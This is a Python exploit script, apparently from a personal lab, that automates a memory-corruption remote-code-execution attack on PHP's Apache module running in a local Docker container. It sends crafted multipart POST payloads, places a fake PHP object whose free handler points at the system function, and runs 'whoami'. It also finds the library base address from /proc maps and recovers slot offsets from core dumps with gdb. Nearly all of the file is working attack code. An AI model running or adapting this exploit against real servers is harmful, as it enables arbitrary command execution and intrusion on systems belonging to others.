#!/usr/bin/env python3
"""oom91: converge with the corrected model.

LAWS (all measured tonight, oom85-90b):
  - probe tile (markers at every 8B slot) ALWAYS crashes; rdi = marker
    of the walked slot -> S = low byte * 8; VA0 from core scan.
  - walked entry is dereferenced only when its type byte (T[S+8]) is
    HIGH (0x5a) — template ti bytes (1/0) made every aim sit SILENT.
  - ti=0x108 for the fake object (NOT 0x208: 1<<9 = IS_OBJ_FREE_CALLED
    SKIPS free_obj — source-verified zend_objects_API.c this run).
  - aim writes [S,S+12) in EVERY copy (uniform tile) -> fake-object
    fields live at A=S+16..A+150 (never hits [S,S+12): A+134 = S+150,
    wrap covers [0,S-26) < S).
Layout inside one 176B tile (offsets relative to A):
   A+0  rc=1 (u32)          <- decrement target P = VA0+A
   A+4  ti=0x108
   A+16 handle=1
   A+24 handlers = VA0+A+56
   A+44 num_args=1
   A+56 T2: offset=0, free_obj=base+ZIF_SYSTEM
   A+80 arg.value = VA0+A+96   A+88 type byte 6
   A+96 gs: rc=1 ti=0x106 h=0 len=14  A+120 "whoami>/tmp/x\\0"
Cycle: PROBE (markers) -> S, VA0 -> AIM -> x / marker|k (loop) / P (chain fault: decode rip).
"""
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0
MARK = 0x5a5a5a5a5a5a5a00


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def marker_tile():
    T = bytearray(176)
    for s in range(0, 176, 8):
        struct.pack_into("<Q", T, s, MARK | (s // 8))
    return bytes(T)


def aim_tile(libphp_base, VA0, S):
    T = bytearray(marker_tile())          # markers everywhere (proven crash)
    A = (S + 16) % 176
    fa = VA0 + A
    gs_off = (A + 96) % 176               # gs+cmd may wrap into next copy
    gs_va = VA0 + (A + 96)                # absolute (copies contiguous)
    t2_off = (A + 56) % 176
    t2_va = VA0 + (A + 56)

    def put(off, data, exempt=False):
        off %= 176
        if not exempt:
            assert not (S <= off < S + 12 or (S + 12 > 176 and off < S + 12 - 176)), \
                "field at %d hits aim-clobber [%d,%d)" % (off, S, S + 12)
        end = off + len(data)
        if end <= 176:
            T[off:end] = data
        else:
            T[off:] = data[:176 - off]
            T[:end - 176] = data[176 - off:]

    put(A + 0, struct.pack("<I", 1))                    # rc
    put(A + 4, struct.pack("<I", 0x108))                # ti: DESTRUCTOR_CALLED, FREE clear
    put(A + 16, struct.pack("<I", 1))                   # handle
    put(A + 24, struct.pack("<Q", t2_va))               # handlers
    put(A + 44, struct.pack("<I", 1))                   # num_args
    put(t2_off, struct.pack("<QI", 0, 0)[:12])          # T2.offset=0 (+pad)
    put(t2_off + 8, struct.pack("<Q", libphp_base + ZIF_SYSTEM))  # free_obj
    put(A + 80, struct.pack("<Q", gs_va))               # arg.value
    put(A + 88, bytes([6, 0, 0, 0]))                    # arg type IS_STRING
    put(gs_off, struct.pack("<IIQI", 1, 0x106, 0, len(CMD)))  # gs header
    put(gs_off + 24, CMD + b"\x00")                     # gs.val
    # the walked zval: value + type_info = IS_OBJECT|refcounted (0x108).
    # Law (measured oom91b): zval type 0x5a=reference / 1=undef SKIP the
    # dispatch; only type&0xf == 8 routes into zend_objects_store_del.
    put(S, struct.pack("<Q", fa), exempt=True)
    put(S + 8, struct.pack("<I", 0x108), exempt=True)
    return bytes(T)


def fetch_core(tag):
    sh("docker cp php_vuln:/tmp/core /tmp/c91_%s" % tag, 240)
    sh("docker cp /tmp/c91_%s phpbuild:/tmp/c91_%s" % (tag, tag), 240)
    return "/tmp/c91_%s" % tag


def gdb_regs(core_in_build):
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi rip\" /tmp/libphp.69.so /tmp/%s'" % core_in_build, 240)
    rdi = rip = None
    m = re.search(r"rdi\s+0x([0-9a-f]+)", out)
    if m:
        rdi = int(m.group(1), 16)
    m = re.search(r"rip\s+0x([0-9a-f]+)", out)
    if m:
        rip = int(m.group(1), 16)
    return rdi, rip


def core_marker_va(core_host, mark_bytes):
    data = open(core_host, "rb").read()
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]
    segs = []
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if struct.unpack_from("<I", data, o)[0] != 1:
            continue
        p_off, p_vaddr = struct.unpack_from("<QQ", data, o + 8)
        p_filesz = struct.unpack_from("<Q", data, o + 0x20)[0]
        if p_filesz:
            segs.append((p_vaddr, p_filesz, p_off))
    pos = 0
    while True:
        i = data.find(mark_bytes, pos)
        if i < 0:
            return None
        for va, sz, o in segs:
            if o <= i < o + sz:
                return va + (i - o)
        pos = i + 1


def check_x():
    x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    return "No such" not in x, x


def fire_cycle(tag, tile, n_finish=3):
    for i, k1 in enumerate(P.K1S[:-1]):
        post(P.build_attack(k1, 9100000 + i * 100000, value_tile=tile))
        hit, x = check_x()
        if hit:
            return {"x": x}
    post(P.build_attack(3400, 9200000, value_tile=tile))
    hit, x = check_x()
    if hit:
        return {"x": x}
    for fi in range(n_finish):
        sb = 9210000 + fi * 4
        code, resp = post(P.build_attack(3400, sb, value_tile=tile))
        t2 = "fatal" if b"Fatal" in resp else ("clean" if code == "200" else "crash")
        print("  [%s] fire%d (%d): %s [%s]" % (tag, fi, sb, code, t2), flush=True)
        time.sleep(2)
        hit, x = check_x()
        if hit:
            return {"x": x}
        if code != "200":
            time.sleep(3)
            cb = fetch_core("%s%d" % (tag, fi))
            rdi, rip = gdb_regs("c91_%s%d" % (tag, fi))
            return {"rdi": rdi, "rip": rip, "core": cb}
    return {}


print("=== oom91: corrected-model converge ===", flush=True)
boot_core_env()
pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
base = None
for ln in maps.splitlines():
    if "libphp.so" in ln and ln.split()[1].startswith("r"):
        base = int(ln.split()[0].split("-")[0], 16)
        break
print("    libphp = 0x%x" % base, flush=True)

S = None
VA0 = None
for cycle in range(3):
    if S is None or VA0 is None:
        print("[cycle %d] PROBE" % (cycle + 1), flush=True)
        r = fire_cycle("p%d" % cycle, marker_tile())
    else:
        print("[cycle %d] AIM slot=%d P=0x%x" % (cycle + 1, S, VA0 + S + 16), flush=True)
        r = fire_cycle("a%d" % cycle, aim_tile(base, VA0, S))
    if "x" in r:
        print("    /tmp/x: [%s]" % r["x"], flush=True)
        print("*** RCE CONFIRMED ***", flush=True)
        sys.exit(0)
    rdi = r.get("rdi")
    if rdi is None:
        print("    no crash, no x — re-probing", flush=True)
        S = None
        continue
    if (rdi & 0xFFFFFFFFFFFFFF00) == MARK:
        S = (rdi & 0xFF) * 8
        VA0raw = core_marker_va(r["core"], struct.pack("<Q", rdi))
        VA0 = VA0raw - S if VA0raw else None
        print("    rdi=0x%x -> slot=%d VA0=%s" % (rdi, S, hex(VA0) if VA0 else None), flush=True)
        if VA0 is None:
            print("[ABORT] marker not in core", flush=True)
            sys.exit(1)
    else:
        print("    rdi=0x%x rip=0x%x — dec landed at P? chain fault (see core)" % (rdi, r.get("rip") or 0), flush=True)
        break

print("[RESULT] S=%s VA0=%s" % (S, hex(VA0) if VA0 else None), flush=True)
print("[restore]", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
